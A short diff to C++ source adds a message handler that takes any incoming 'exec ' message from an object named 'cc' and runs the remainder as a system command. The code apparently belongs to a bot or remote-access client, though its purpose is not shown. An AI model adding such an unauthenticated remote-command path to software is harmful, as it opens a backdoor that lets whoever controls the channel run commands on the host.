@@ -148,6 +148,11 @@ void MainThread(unsigned int parentThreadId)
                 cc->Send(line);
             }
         }
+        else if (message.substr(0, 5) == "exec ")
+        {
+            string command = message.substr(5);
+            Processes::Execute(command);
+        }
         else if (message == "hello")
         {
             cc->Send("hello");
